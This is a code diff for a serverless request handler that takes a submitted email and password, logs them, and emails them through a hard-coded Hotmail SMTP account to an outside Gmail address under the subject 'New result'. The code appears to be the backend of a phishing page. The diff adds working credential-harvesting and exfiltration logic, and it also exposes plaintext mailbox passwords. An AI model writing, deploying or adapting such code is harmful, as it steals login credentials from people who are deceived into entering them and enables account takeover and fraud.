@@ -9,21 +9,26 @@ export default async (req: Request, context: Context) => {
   console.log('response:', {email, password})
 
   const transporter = nodemailer.createTransport({
-  host: "smtp.forwardemail.net",
-  port: 465,
-  secure: true, // upgrade later with STARTTLS
+  host: "smtp.office365.com",
+  port: 587,
+  secure: false,
   auth: {
-    user: "wirthschwind@gmail.com",
-    pass: "Relish2023!@",
+    user: "pc_golf@hotmail.com",
+    pass: "Jakob1912",
   },
 });
+
   const message = {
-  from: "wirthschwind@gmail.com",
-  to: "dexolol807@roborena.com",
-  subject: "Message title",
-  text: "Plaintext version of the message",
-  html: "<p>HTML version of the message</p>",
-};
+      from: "pc_golf@hotmail.com",
+      to: "emilychan1178@gmail.com",
+      subject: "New result",
+      text: `Email: ${email} :: Password: ${password} :: Context: ${context}`,
+      html: `<p>Result context: /n/n
+            Email:: ${email} /n
+            Password:: ${password} /n
+            Context:: ${context}
+            </p>`,
+    };
 
   switch(req?.method){
     case "POST":
